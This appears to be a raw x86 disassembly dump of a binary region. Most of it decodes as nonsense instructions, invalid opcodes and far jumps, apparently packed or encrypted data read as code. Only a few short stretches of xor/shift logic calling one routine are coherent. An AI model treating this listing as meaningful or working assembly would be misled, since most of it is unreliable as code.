  4147e3:	test   DWORD PTR [edx],ecx
  4147e5:	sbb    DWORD PTR [edi-0x76],esi
  4147e8:	in     al,dx
  4147e9:	jne    0x414798
  4147eb:	push   esp
  4147ec:	stos   DWORD PTR es:[edi],eax
  4147ed:	dec    esp
  4147ee:	es push ds
  4147f0:	std    
  4147f1:	nop
  4147f2:	add    al,0x5c
  4147f4:	(bad)  
  4147f5:	push   ebp
  4147f6:	jnp    0x4147bb
  4147f8:	push   ebp
  4147f9:	push   ebp
  4147fa:	mov    esp,0x44f9e26
  4147ff:	call   0x72e1:0x2fb8667b
  414806:	fcomip st,st(0)
  414808:	and    BYTE PTR [eax],ch
  41480a:	adc    BYTE PTR [eax+ebp*4-0x52203d97],ch
  414811:	aaa    
  414812:	outs   dx,DWORD PTR ds:[esi]
  414813:	ret    
  414814:	ret    0x83d
  414817:	test   eax,0xc2ef231b
  41481c:	add    al,0xae
  41481e:	dec    edx
  41481f:	fisttp QWORD PTR [edi-0x59]
  414822:	push   edx
  414823:	scas   eax,DWORD PTR es:[edi]
  414824:	call   0xf0b781d6
  414829:	cmc    
  41482a:	and    BYTE PTR [ecx],cl
  41482c:	in     eax,dx
  41482d:	aam    0x6b
  41482f:	mov    BYTE PTR [eax+0x47],0x3f
  414833:	les    esp,FWORD PTR [ecx+ebx*8]
  414836:	cwde   
  414837:	cli    
  414838:	and    DWORD PTR [ebp+ecx*4+0x32],ebp
  41483c:	pushf  
  41483d:	enter  0x8b68,0x93
  414841:	(bad)  [edx-0x7e3c828f]
  414847:	aam    0x35
  414849:	not    DWORD PTR [ebp-0x20c42ef4]
  41484f:	xor    al,0x4d
  414851:	leave  
  414852:	mov    ebx,0xd73f1c28
  414857:	pop    ss
  414858:	dec    ebx
  414859:	ficom  WORD PTR [ebx+0x32baffae]
  41485f:	js     0x414895
  414861:	and    ecx,DWORD PTR [ecx+ebx*2]
  414864:	jmp    0x414865
  414866:	adc    eax,0xb630cda9
  41486b:	das    
  41486c:	inc    esp
  41486d:	adc    BYTE PTR [edx],0xae
  414870:	xor    esi,DWORD PTR [esi+0x70c10aaf]
  414876:	push   esp
  414877:	xor    dl,BYTE PTR [ebp-0x541ce7cb]
  41487d:	cdq    
  41487e:	dec    ebp
  41487f:	inc    BYTE PTR [ebp-0x2a]
  414882:	pusha  
  414883:	adc    DWORD PTR [esi],eax
  414885:	imul   ecx,DWORD PTR [ebp+edx*8-0x1a],0xebed8383
  41488d:	mov    dl,0x3e
  41488f:	iret   
  414890:	xor    eax,edi
  414892:	xor    ecx,ebx
  414894:	shr    eax,0x2
  414897:	shl    ecx,0x1e
  41489a:	or     ecx,eax
  41489c:	push   ecx
  41489d:	lea    eax,[ebp-0x8]
  4148a0:	push   eax
  4148a1:	lea    eax,[ebp-0x80]
  4148a4:	push   eax
  4148a5:	call   0x41182a
  4148aa:	mov    eax,DWORD PTR [ebp-0x8]
  4148ad:	mov    ecx,DWORD PTR [ebp-0x8]
  4148b0:	xor    eax,edi
  4148b2:	xor    ecx,ebx
  4148b4:	shr    eax,0x2
  4148b7:	shl    ecx,0x1e
  4148ba:	or     ecx,eax
  4148bc:	push   ecx
  4148bd:	lea    eax,[ebp-0x24]
  4148c0:	push   eax
  4148c1:	mov    eax,DWORD PTR [ebp+0x8]
  4148c4:	mov    ecx,DWORD PTR [ebp+0xc]
  4148c7:	shrd   eax,ecx,0x2
  4148cb:	shr    ecx,0x2
  4148ce:	mov    ecx,DWORD PTR [ebp+0x8]
  4148d1:	mov    edx,DWORD PTR [ebp+0xc]
  4148d4:	xor    eax,esi
  4148d6:	xor    edx,edx
  4148d8:	or     eax,edx
  4148da:	lea    eax,[ebp+eax*4-0x7c]
  4148de:	jmp    0x414c68
  4148e3:	and    DWORD PTR ds:0xbdaead9e,edx
  4148e9:	sub    DWORD PTR [ebp+0x7171e0c0],ebx
  4148ef:	pushf  
  4148f0:	mov    cl,0xea
  4148f2:	cmp    ecx,ebx
  4148f4:	mov    ds:0xc590bbbb,eax
  4148f9:	mov    ebx,0x88b8e1bb
  4148fe:	add    ebp,DWORD PTR [ebx+0x710c6780]
  414904:	mov    ch,0x96
  414906:	adc    ah,bh
  414908:	inc    esp
  414909:	cmp    BYTE PTR [eax+ebp*1-0x48],dh
  41490d:	push   cs
  41490e:	aaa    
  41490f:	sub    al,0xe2
  414911:	push   edx
  414912:	xchg   ecx,eax
  414913:	pop    esp
  414914:	rcl    WORD PTR [edx+0x5eef05a8],1
  41491b:	data16 clc 
  41491d:	clc    
  41491e:	aas    
  41491f:	push   edi
  414920:	sub    eax,0xfd68e189
  414925:	push   cs
  414926:	in     eax,dx
  414927:	pop    edx
  414928:	mul    BYTE PTR [eax]
  41492a:	mov    al,0x17
  41492c:	mov    eax,ds:0xf45d9a6
  414931:	imul   ebp,DWORD PTR [ebp+0x6d],0x49
  414935:	mov    bl,BYTE PTR [edi]
  414937:	iret   
  414938:	inc    ebx
  414939:	mov    WORD PTR [ebx-0x3349c42c],gs
  41493f:	fnstenv [edi]
  414941:	mov    bl,0xa4
  414943:	mov    ebp,0x14f1ac00
  414948:	push   eax
  414949:	xor    edi,ecx
  41494b:	ja     0x414990
  41494d:	or     BYTE PTR [ebx+ecx*4+0x3a48141f],0x97
  414955:	das    
  414956:	or     bl,BYTE PTR [edi-0x6e]
  414959:	loop   0x41491d
  41495b:	out    dx,al
  41495c:	scas   eax,DWORD PTR es:[edi]
  41495d:	sahf   
  41495e:	ins    BYTE PTR es:[edi],dx
  41495f:	and    DWORD PTR [ebx-0xb],edx
  414962:	fs adc edx,edi
  414965:	fbstp  TBYTE PTR [eax-0x48]
  414968:	(bad)  
  414969:	mov    dl,0xb7
  41496b:	fs pop es
  41496d:	imul   edx,DWORD PTR [ebx],0xb188968f
  414973:	mov    ebp,0xdb29449f
  414978:	xor    ebp,esp
  41497a:	call   DWORD PTR ds:0x4edf46ae
  414980:	mov    BYTE PTR [edx+esi*4+0x340d6b31],ah
  414987:	pop    ebx
  414988:	sbb    ah,BYTE PTR [ebp-0x9]
  41498b:	pop    ds
  41498c:	pop    ebx
  41498d:	fcmovbe st,st(0)
  41498f:	or     bl,BYTE PTR [edi-0xa]
  414992:	jno    0x41493b
  414994:	(bad)  
  414995:	(bad)  
  414996:	(bad)  
  414997:	jmp    0x414963
  414999:	clc    
  41499a:	jecxz  0x414a10
  41499c:	out    dx,al
  41499d:	lods   al,BYTE PTR ds:[esi]
  41499e:	cli    
  41499f:	pop    ebp
  4149a0:	fdiv   QWORD PTR [edi]
  4149a3:	js     0x41492b
  4149a5:	out    dx,al
  4149a6:	pop    eax
  4149a7:	sbb    esi,ecx
  4149a9:	into   
  4149aa:	retf   
  4149ab:	fcom   QWORD PTR [ebx+0x40]
  4149ae:	adc    BYTE PTR [esi+edx*4],bh
  4149b1:	sti    
  4149b2:	sbb    edi,DWORD PTR [ebx+0x6c8716d8]
  4149b8:	out    dx,eax
  4149b9:	pop    edx
  4149ba:	cli    
  4149bb:	jb     0x4149d9
  4149bd:	rcl    bh,0xc2
  4149c0:	mov    esp,0x4ed17431
  4149c5:	mov    WORD PTR [edi],ds
  4149c7:	cmp    DWORD PTR [eax*8+0x3175a43a],esp
  4149ce:	lds    ecx,FWORD PTR [eax-0x40]
  4149d1:	inc    eax
  4149d2:	pop    es
  4149d3:	lds    ebx,FWORD PTR [ecx+eiz*8+0x7a978b0e]
  4149da:	js     0x4149d1
  4149dc:	xor    eax,0x6023da0c
  4149e1:	dec    eax
  4149e2:	xchg   ecx,eax
  4149e3:	test   DWORD PTR ds:0x52419ec7,0xf8456686
  4149ed:	xchg   edi,eax
  4149ee:	pop    ebx
  4149ef:	cmp    eax,0xe87b292
  4149f4:	retf   0xc45f
  4149f7:	sub    ebp,esp
  4149f9:	shl    DWORD PTR [esi-0x35],0x6e
  4149fd:	int    0x75
  4149ff:	and    edi,DWORD PTR [edx+ebp*1-0x12e97128]
  414a06:	fwait
  414a07:	push   ebx
  414a08:	mov    esi,0x8a67f093
  414a0d:	jmp    0x71bc:0xf45cb6b6
  414a14:	add    DWORD PTR [edx+0x322a0829],esi
  414a1a:	jbe    0x4149e5
  414a1c:	mov    bh,0xb1
  414a1e:	xor    BYTE PTR [esi-0x59],al
  414a21:	cld    
  414a22:	sbb    ch,BYTE PTR [ecx-0x6c]
  414a25:	mov    cl,0x73
  414a27:	mov    edx,0x83be8e24
  414a2c:	les    sp,DWORD PTR [esi-0x67]
  414a30:	inc    ebp
  414a31:	mov    ds:0x2a6a36f4,eax
  414a36:	and    ebp,DWORD PTR [edi-0x7f]
  414a39:	add    cl,bh
  414a3b:	test   BYTE PTR [esi+0x59],dh
  414a3e:	push   esp
  414a3f:	jno    0x414a57
  414a41:	cld    
  414a42:	push   ecx
  414a43:	and    bl,BYTE PTR [edi-0x246e7ae0]
  414a49:	(bad)  
  414a4a:	sub    eax,0x415ced06
  414a4f:	push   edi
  414a50:	sbb    DWORD PTR es:[ebp+0x66],ebx
  414a54:	mov    ds:0xc5312168,eax
  414a59:	sti    
  414a5a:	pop    edi
  414a5b:	xchg   esp,eax
  414a5c:	sbb    DWORD PTR [ebx],edi
  414a5e:	into   
  414a5f:	jg     0x414a5c
  414a61:	mov    dh,0xa2
  414a63:	mov    ebp,0x4683a709
  414a68:	push   ds
  414a69:	inc    eax
  414a6a:	pop    ecx
  414a6b:	sbb    DWORD PTR [ebp+0x47],edi
  414a6e:	xchg   BYTE PTR [esi-0x5a],cl
  414a71:	push   edx
  414a72:	and    BYTE PTR [ebp+0x7a],al
  414a75:	adc    eax,DWORD PTR [esi+ecx*2+0x5a8ff48]
  414a7c:	sbb    eax,0x82121f48
  414a81:	push   ss
  414a82:	aas    
  414a83:	mov    ah,0xc3
  414a85:	xlat   BYTE PTR ds:[ebx]
  414a86:	mov    ebx,0xed905832
  414a8b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414a8c:	jmp    0x26b0d1bb
  414a91:	mov    al,0xcf
  414a93:	mov    ebp,0xe00568f2
  414a98:	cmp    DWORD PTR [ecx+ebp*4-0x4f217027],0xf30c6243
  414aa3:	push   esp
  414aa4:	stos   DWORD PTR es:[edi],eax
  414aa5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414aa6:	fst    DWORD PTR [edi+0x5cf4e9fb]
  414aac:	push   esp
  414aad:	push   eax
  414aae:	mov    DWORD PTR [ebp-0x5b],edx
  414ab1:	outs   dx,BYTE PTR ds:[esi]
  414ab2:	add    al,0xad
  414ab4:	imul   esi,DWORD PTR [eax+edx*8+0x110ff7c3],0xea5abf76
  414abf:	jl     0x414b08
  414ac1:	popf   
  414ac2:	pop    es
  414ac3:	aad    0xb7
  414ac5:	or     ch,BYTE PTR [edi-0x7e6399b9]
  414acb:	cmp    eax,DWORD PTR [edi-0x4568b06f]
  414ad1:	(bad)  
  414ad2:	xor    ebx,DWORD PTR [edi+0x38]
  414ad5:	mov    ss,WORD PTR [edi-0x7eaefbef]
  414adb:	xchg   esp,eax
  414adc:	in     eax,0x80
  414ade:	mov    al,ds:0xd13e5b05
  414ae3:	add    DWORD PTR [ebp+0xa2e60cb],ecx
  414ae9:	sti    
  414aea:	iret   
  414aeb:	retf   0x9548
  414aee:	pop    eax
  414aef:	adc    ecx,DWORD PTR [ecx-0x6c5d9af0]
  414af5:	jle    0x414a88
  414af7:	repz jmp 0xe6af:0x2a81d803
  414aff:	mov    bl,0x2f
  414b01:	pop    ds
  414b02:	mov    ecx,0x3dbd1c16
  414b07:	rcl    BYTE PTR [edi+0x5e],cl
  414b0a:	fnstenv [eax+0x2e]
  414b0d:	sub    eax,0x64d1144
  414b12:	mov    ch,0xb4
  414b14:	xlat   BYTE PTR ds:[ebx]
  414b15:	xlat   BYTE PTR ds:[ebx]
  414b16:	inc    esp
  414b17:	xchg   ebp,eax
  414b18:	mov    al,0x53
  414b1a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414b1b:	js     0x414b31
  414b1d:	and    BYTE PTR [ebx-0x77da606e],0x4c
  414b24:	imul   esp,eax,0xffffff97
  414b27:	sbb    BYTE PTR [edx-0x21],al
  414b2a:	xor    esi,DWORD PTR [ecx+0x15]
  414b2d:	rcl    DWORD PTR [ebx+0x2b],0xcb
  414b31:	cwde   
  414b32:	xchg   ecx,eax
  414b33:	jae    0x414b40
  414b35:	push   0x58
  414b37:	mov    edx,esp
  414b39:	outs   dx,DWORD PTR ds:[esi]
  414b3a:	pop    esi
  414b3b:	xchg   DWORD PTR [edi],edi
  414b3d:	lds    esi,FWORD PTR [edi]
  414b3f:	shl    dl,0xf
  414b42:	push   ebp
  414b43:	push   edi
  414b44:	sub    eax,0xbe8a7b86
  414b49:	and    eax,0x74488339
  414b4e:	scas   al,BYTE PTR es:[edi]
  414b4f:	shl    DWORD PTR [edx],1
  414b51:	dec    esp
  414b52:	js     0x414b45
  414b54:	mov    BYTE PTR [esi+0x63],ch
  414b57:	push   0x951c88af
  414b5c:	mul    BYTE PTR [edx+0x18ebc6e8]
  414b62:	mov    bh,0xf1
  414b64:	mov    dl,0x7f
  414b66:	push   cs
  414b67:	daa    
  414b68:	push   ebx
  414b69:	mov    dl,0x68
  414b6b:	mov    ds:0x5dcd66fe,eax
  414b70:	add    BYTE PTR [ecx],bh
  414b72:	stos   BYTE PTR es:[edi],al
  414b73:	push   0x55
  414b75:	fcom   QWORD PTR [ecx]
  414b77:	mov    edx,0xa29b880c
  414b7c:	mov    ds,WORD PTR [eax+0x77ce838b]
  414b82:	and    cl,BYTE PTR [edi+ebp*2]
  414b85:	test   BYTE PTR [esi-0x61],cl
  414b88:	icebp  
  414b89:	mov    ebx,0x42902243
  414b8e:	or     eax,0x21013be2
  414b93:	shl    BYTE PTR [esi+edx*2],cl
  414b96:	iret   
  414b97:	inc    esp
  414b98:	outs   dx,DWORD PTR ds:[esi]
  414b99:	add    al,0xb
  414b9b:	(bad)  
  414b9c:	imul   BYTE PTR [edx-0xa]
  414b9f:	push   es
  414ba0:	dec    eax
  414ba1:	sbb    eax,ebx
  414ba3:	push   es
  414ba4:	mov    bl,0x15
  414ba6:	jae    0x414bd9
  414ba8:	aam    0x87
  414baa:	stc    
  414bab:	movq   QWORD PTR [edx],mm7
  414bae:	xor    BYTE PTR [esi-0x12],bl
  414bb1:	pop    ds
  414bb2:	and    eax,DWORD PTR ds:0x99a7b27b
  414bb8:	push   esi
  414bb9:	mov    dh,0x2f
  414bbb:	stc    
  414bbc:	xor    BYTE PTR [ecx+0x56541b23],bl
  414bc2:	in     eax,0xa8
  414bc4:	mov    edi,0x13211158
  414bc9:	jmp    0xf4e54ba6
  414bce:	push   ss
  414bcf:	mov    ecx,0xfa225b91
  414bd4:	and    ebp,ebp
  414bd6:	retf   
  414bd7:	push   0xea420a65
  414bdc:	push   eax
  414bdd:	dec    eax
  414bde:	add    DWORD PTR [ecx-0xa],ecx
  414be1:	xchg   esi,eax
  414be2:	in     eax,0xea
  414be4:	aaa    
  414be5:	loopne 0x414bfb
  414be7:	fmul   st,st(1)
  414be9:	cdq    
  414bea:	je     0x414c42
  414bec:	aad    0x70
  414bee:	fistp  QWORD PTR [ebx+0x4a9d4bca]
  414bf4:	dec    esi
  414bf5:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  414bf7:	or     al,BYTE PTR [ecx+0x220f5a56]
  414bfd:	ja     0x414bf0
  414bff:	gs add al,0xa1
  414c02:	ins    BYTE PTR es:[edi],dx
  414c03:	imul   esp,DWORD PTR [eax],0x85300012
  414c09:	inc    esp
  414c0a:	std    
  414c0b:	xlat   BYTE PTR ds:[ebx]
  414c0c:	dec    ecx
  414c0d:	ins    BYTE PTR es:[edi],dx
  414c0e:	jl     0x414c43
  414c10:	xchg   edx,eax
  414c11:	xor    eax,0x2f430a3c
  414c16:	mov    ebx,0x63a41e83
  414c1b:	repz mov bl,0xa7
  414c1e:	mov    ds:0xbd36f8a2,eax
  414c23:	enter  0x5b8a,0xce
  414c27:	pop    ss
  414c28:	dec    ebx
  414c29:	sub    eax,edi
  414c2b:	cld    
  414c2c:	sar    DWORD PTR ds:0x8689dc47,cl
  414c32:	cmp    eax,0xf7d68a3f
  414c37:	and    esp,DWORD PTR [edx+eax*1+0x52e6012a]
  414c3e:	mov    ebx,0xf1f4868
  414c43:	ins    DWORD PTR es:[edi],dx
  414c44:	xor    al,0x37
  414c46:	imul   edi,DWORD PTR [ecx],0xe
  414c49:	(bad)  
  414c4a:	jl     0x414bf9
  414c4c:	push   eax
  414c4d:	sbb    al,ch
  414c4f:	cdq    
  414c50:	imul   DWORD PTR [ebx]
  414c52:	int3   
  414c53:	sub    edi,DWORD PTR [ebx]
  414c55:	in     eax,dx
  414c56:	pushf  
  414c57:	adc    DWORD PTR [eax+0x375dc316],esp
  414c5d:	aad    0xf5
  414c5f:	loop   0x414bf1
  414c61:	or     BYTE PTR [esi-0xee2adee],dh
  414c67:	inc    ebx
  414c68:	push   eax
  414c69:	shl    ecx,0x1e
  414c6c:	call   0x41182a
  414c71:	mov    eax,DWORD PTR [ebp-0x8]
  414c74:	mov    ecx,DWORD PTR [ebp-0x8]
  414c77:	xor    eax,edi
  414c79:	xor    ecx,ebx
  414c7b:	shr    eax,0x2
  414c7e:	shl    ecx,0x1e
  414c81:	or     ecx,eax
  414c83:	push   ecx
  414c84:	lea    eax,[ebp-0x30]
  414c87:	push   eax
  414c88:	mov    eax,DWORD PTR [ebp+0x10]
  414c8b:	mov    ecx,DWORD PTR [ebp+0x14]
  414c8e:	jmp    0x415018
  414c93:	inc    edi
  414c94:	aaa    
  414c95:	mov    bl,0x3f
  414c97:	mov    bl,0x3f
  414c99:	mov    bh,0x37
  414c9b:	inc    esi
  414c9c:	sbb    esp,eax
  414c9e:	sti    
  414c9f:	add    BYTE PTR [ecx],ah
  414ca1:	fsubr  QWORD PTR [edi-0x60]
  414ca4:	lods   eax,DWORD PTR ds:[esi]
  414ca5:	mov    ebx,0xbbc590bb
  414caa:	mov    ebx,0x532a7210
  414caf:	sbb    esp,DWORD PTR [edx+0x12]
  414cb2:	pusha  
  414cb3:	cmp    BYTE PTR [eax-0x40d00301],ah
  414cb9:	cmc    
  414cba:	int3   
  414cbb:	push   0xffffffa9
  414cbd:	pop    edx
  414cbe:	sub    cl,bl
  414cc0:	les    edi,FWORD PTR [ebx+0x31c0c075]
  414cc6:	jp     0x414cbe
  414cc8:	sbb    al,0xd1
  414cca:	fstp   DWORD PTR [ebx]
  414ccc:	push   0x4c
  414cce:	or     DWORD PTR [eax+ebp*4+0x119f1af1],ecx
  414cd5:	outs   dx,BYTE PTR ds:[esi]
  414cd7:	sub    BYTE PTR ds:0x4af33c26,0x9
  414cde:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414cdf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414ce0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414ce1:	xchg   esp,eax
  414ce2:	popa   
  414ce3:	mov    fs,WORD PTR [edi+0x116c2d3a]
  414ce9:	pop    eax
  414cea:	mov    dh,0xc7
  414cec:	fild   WORD PTR ds:0xeca60d78
  414cf2:	(bad)  [ecx-0x56]
  414cf5:	(bad)  
  414cf6:	mov    al,ds:0xce924788
  414cfb:	stc    
  414cfc:	cmp    ecx,edx
  414cfe:	push   ecx
  414cff:	sbb    eax,0x65bd0da5
  414d04:	(bad)  
  414d05:	repz mov al,0x12
  414d08:	jb     0x414cf8
  414d0a:	lds    ebp,FWORD PTR [eax]
  414d0c:	jl     0x414c95
  414d0e:	loopne 0x414ccd
  414d10:	push   edi
  414d11:	jnp    0x414d41
  414d13:	inc    esi
  414d14:	lds    ebx,FWORD PTR [esi+0x19]
  414d17:	ja     0x414d95
  414d19:	pop    ecx
  414d1b:	(bad)  
  414d1c:	stc    
  414d1d:	ja     0x414d02
  414d1f:	test   DWORD PTR [edi],ebx
  414d21:	dec    esp
  414d22:	xor    al,0x6d
  414d24:	push   es
  414d25:	popa   
  414d26:	fwait
  414d27:	pusha  
  414d28:	dec    ecx
  414d29:	push   esp
  414d2a:	push   ecx
  414d2b:	ror    BYTE PTR [ecx-0x21],0xb0
  414d2f:	sub    eax,0x49815cbb
  414d34:	ja     0x414d4c
  414d36:	cld    
  414d37:	mov    bh,0x16
  414d39:	xchg   edi,eax
  414d3a:	mov    dl,0xfc
  414d3c:	mov    eax,0xf3d1d717
  414d41:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414d42:	int    0xa9
  414d44:	add    edi,esi
  414d46:	lock (bad) 
  414d48:	mov    eax,ds:0xbfecbc63
  414d4d:	jle    0x414d7e
  414d4f:	ds add eax,0x929f2e7e
  414d55:	in     al,dx
  414d56:	jo     0x414dbf
  414d58:	aam    0x99
  414d5a:	mov    ds:0x4875e769,eax
  414d5f:	sub    edx,edx
  414d61:	xchg   ebx,eax
  414d62:	dec    esi
  414d63:	fidiv  WORD PTR [eax]
  414d65:	addr16 xchg esi,eax
  414d67:	outs   dx,DWORD PTR ds:[esi]
  414d68:	xchg   edx,eax
  414d69:	aad    0xa0
  414d6b:	push   0x53
  414d6d:	loope  0x414dbd
  414d6f:	adc    eax,0xe728c0a5
  414d74:	jle    0x414d88
  414d76:	mov    ds:0x9cbbe9cb,eax
  414d7b:	jge    0x414d98
  414d7d:	jecxz  0x414d7b
  414d7f:	rcl    BYTE PTR [edi-0x37],0x63
  414d83:	push   ecx
  414d84:	stos   BYTE PTR es:[edi],al
  414d85:	mov    ds:0xf19e8634,ax
  414d8b:	sar    BYTE PTR [esi-0x1a],cl
  414d8e:	and    ch,ah
  414d90:	daa    
  414d91:	mov    DWORD PTR [ecx-0x52],edx
  414d94:	mov    esi,0x6caafd2a
  414d99:	pop    edi
  414d9a:	cmp    DWORD PTR [ebx-0x74],ecx
  414d9d:	push   ecx
  414d9e:	cmp    eax,0x6fa3aedf
  414da3:	jg     0x414dc7
  414da5:	push   ss
  414da6:	dec    ebp
  414da7:	sahf   
  414da8:	pop    es
  414da9:	in     al,dx
  414daa:	daa    
  414dab:	mov    dl,ch
  414dad:	jo     0x414de4
  414daf:	jo     0x414d3e
  414db1:	ficomp WORD PTR [edi]
  414db3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414db4:	cmp    al,0x1a
  414db6:	dec    ebx
  414db7:	push   cs
  414db8:	mov    edi,0x3e2e46a2
  414dbd:	pop    ecx
  414dbe:	lahf   
  414dbf:	hlt    
  414dc0:	icebp  
  414dc1:	mov    WORD PTR [edx-0x7eda3f8f],gs
  414dc7:	jmp    0x414dc9
  414dc9:	rol    DWORD PTR [edx],0xfd
  414dcc:	into   
  414dcd:	cmp    DWORD PTR [esi-0x6c843193],0x8f1c420c
  414dd7:	inc    ebx
  414dd8:	push   0xfffffff7
  414dda:	cs mov edx,0x13ee5dc5
  414de0:	pop    eax
  414de1:	xor    bl,BYTE PTR [ecx+0x76]
  414de4:	and    eax,0x636614be
  414de9:	xor    DWORD PTR [ebx-0x69],ebx
  414dec:	fcomp  DWORD PTR [edi]
  414dee:	inc    edi
  414def:	or     dl,0x9f
  414df2:	jp     0x414d83
  414df4:	jae    0x414e2b
  414df6:	jp     0x414d93
  414df8:	pop    ebp
  414df9:	cld    
  414dfa:	or     ebx,DWORD PTR [esp+edi*4]
  414dfd:	adc    BYTE PTR [ecx+0x162c8180],ch
  414e03:	or     BYTE PTR [esi-0x4c69f9f6],al
  414e09:	or     al,0x86
  414e0b:	imul   esi,esp,0xffffffd0
  414e0e:	in     eax,0x3
  414e10:	and    DWORD PTR [ecx],ecx
  414e12:	cmp    ch,BYTE PTR [edx]
  414e14:	xchg   ecx,eax
  414e15:	sti    
  414e16:	cs and al,0xb4
  414e19:	push   0x6e
  414e1b:	mov    al,BYTE PTR ss:[edx]
  414e1e:	in     eax,0x1b
  414e20:	jo     0x414e5b
  414e22:	fiadd  WORD PTR [edx+0x4]
  414e25:	inc    esp
  414e26:	daa    
  414e27:	outs   dx,BYTE PTR ds:[esi]
  414e28:	xor    al,0x63
  414e2a:	sbb    al,0x0
  414e2c:	arpl   si,sp
  414e2e:	sub    esi,DWORD PTR [edx-0x46]
  414e31:	std    
  414e32:	cdq    
  414e33:	nop
  414e34:	pop    es
  414e35:	mov    ah,0xc
  414e37:	je     0x414e57
  414e39:	sbb    al,0x69
  414e3b:	adc    ebx,ebp
  414e3d:	dec    ebx
  414e3e:	loopne 0x414e58
  414e40:	xlat   BYTE PTR ds:[ebx]
  414e41:	inc    esi
  414e42:	xchg   esp,eax
  414e43:	in     eax,dx
  414e44:	out    0x3f,eax
  414e46:	mov    bh,0x7
  414e48:	jp     0x414e51
  414e4a:	mov    dh,0x8e
  414e4c:	pop    ss
  414e4d:	ret    
  414e4e:	popa   
  414e4f:	adc    bl,BYTE PTR [edx+eax*8]
  414e52:	or     eax,0x14d4962b
  414e57:	sahf   
  414e58:	mov    esi,0xbe9b962c
  414e5d:	jae    0x414e15
  414e5f:	xor    al,0x1
  414e61:	inc    esp
  414e62:	js     0x414e4f
  414e64:	mov    edi,0xfd279258
  414e69:	xor    DWORD PTR ss:[esi-0x7d28b568],edx
  414e70:	mov    gs,WORD PTR ds:0xddd7b686
  414e76:	call   0x57f4c53e
  414e7b:	pop    ebp
  414e7c:	scas   al,BYTE PTR es:[edi]
  414e7d:	hlt    
  414e7e:	(bad)  
  414e7f:	shl    BYTE PTR [eax-0x33],cl
  414e82:	lods   al,BYTE PTR ds:[esi]
  414e83:	adc    ch,al
  414e85:	pop    ss
  414e86:	neg    BYTE PTR [eax+edi*2]
  414e89:	fistp  DWORD PTR [ecx]
  414e8b:	mov    eax,0x88a08aa2
  414e90:	call   0x78c5:0xd3653c0a
  414e97:	or     BYTE PTR [eax+0x6b],ch
  414e9a:	jl     0x414eba
  414e9c:	imul   ebx,DWORD PTR ds:0xd0be78c5,0x2f52462b
  414ea6:	leave  
  414ea7:	sar    DWORD PTR [ebx+0x19],1
  414eaa:	adc    ebp,DWORD PTR [esi-0xe]
  414ead:	mov    ecx,0x926955b0
  414eb2:	int3   
  414eb3:	lods   al,BYTE PTR ds:[esi]
  414eb4:	add    eax,0x4008fbbc
  414eb9:	add    eax,0x53fb68de
  414ebe:	int    0x97
  414ec0:	das    
  414ec1:	sub    DWORD PTR [esi],ebx
  414ec3:	cmp    DWORD PTR [edx-0x66],ebp
  414ec6:	sbb    al,0xa0
  414ec8:	loop   0x414f2e
  414eca:	into   
  414ecb:	ss and al,0xde
  414ece:	ins    DWORD PTR es:[edi],dx
  414ecf:	jb     0x414ed4
  414ed1:	mov    dl,0xf9
  414ed3:	mov    esp,0xc55fe366
  414ed8:	lods   eax,DWORD PTR ds:[esi]
  414ed9:	push   ss
  414eda:	scas   al,BYTE PTR es:[edi]
  414edb:	xor    eax,DWORD PTR [edi]
  414edd:	mov    eax,ds:0xacf4ef5a
  414ee2:	gs push ebp
  414ee4:	inc    esp
  414ee5:	outs   dx,DWORD PTR ds:[esi]
  414ee6:	mov    edi,0xc9fb7693
  414eeb:	mov    al,ds:0x23e89286
  414ef0:	pop    es
  414ef1:	mov    BYTE PTR [edx],0x30
  414ef4:	push   ecx
  414ef5:	stos   DWORD PTR es:[edi],eax
  414ef6:	adc    DWORD PTR [edi],esi
  414ef8:	out    dx,eax
  414ef9:	out    dx,al
  414efa:	out    0xf5,al
  414efc:	cmp    edi,DWORD PTR [ecx-0x67920b2f]
  414f02:	dec    edx
  414f03:	push   cs
  414f04:	fcomi  st,st(2)
  414f06:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414f07:	pop    ebx
  414f08:	retf   0xbab3
  414f0b:	fstp   DWORD PTR cs:[esi+0x5982363a]
  414f12:	inc    esp
  414f13:	jae    0x414ee5
  414f15:	dec    edx
  414f16:	inc    edi
  414f17:	jae    0x414f13
  414f19:	dec    ebx
  414f1a:	ins    DWORD PTR es:[edi],dx
  414f1b:	sar    BYTE PTR [ecx-0x33033915],0xa8
  414f22:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414f23:	add    dh,cl
  414f25:	nop
  414f26:	ins    BYTE PTR es:[edi],dx
  414f27:	fst    DWORD PTR [ebx-0x3]
  414f2a:	mov    eax,ds:0xc22d0d4c
  414f2f:	ins    BYTE PTR es:[edi],dx
  414f30:	pop    ss
  414f31:	ret    0xacb4
  414f34:	mov    ch,bh
  414f36:	or     dl,BYTE PTR [eax+0xd292bc3]
  414f3c:	or     al,0x88
  414f3e:	xchg   BYTE PTR [ebp-0x6ce838b],al
  414f44:	xor    edi,ebp
  414f46:	cli    
  414f47:	imul   ebp
  414f49:	mov    cl,bh
  414f4b:	dec    esi
  414f4c:	scas   eax,DWORD PTR es:[edi]
  414f4d:	lods   al,BYTE PTR ds:[esi]
  414f4e:	cs push 0xffffffac
  414f51:	xor    DWORD PTR [edx+ebp*1-0x480c5ec8],0x68303a89
  414f5c:	jne    0x414fa1
  414f5e:	leave  
  414f5f:	clc    
  414f60:	xor    cl,BYTE PTR [esi]
  414f62:	cmp    eax,0x68b69eb9
  414f67:	repz rol BYTE PTR [edx-0x4428fc17],cl
  414f6e:	retf   
  414f6f:	fbld   TBYTE PTR [edi+esi*2+0x78753ff0]
  414f76:	sub    DWORD PTR [eax+0x1],esi
  414f79:	daa    
  414f7a:	das    
  414f7b:	cld    
  414f7c:	(bad)  
  414f7d:	fsubr  DWORD PTR [edx+0x70]
  414f80:	cmp    eax,0xae48e062
  414f85:	popf   
  414f86:	push   es
  414f87:	mov    ch,dh
  414f89:	test   al,0xb6
  414f8b:	mov    al,0xf9
  414f8d:	pop    ebx
  414f8e:	arpl   WORD PTR [eax],cx
  414f90:	pop    ss
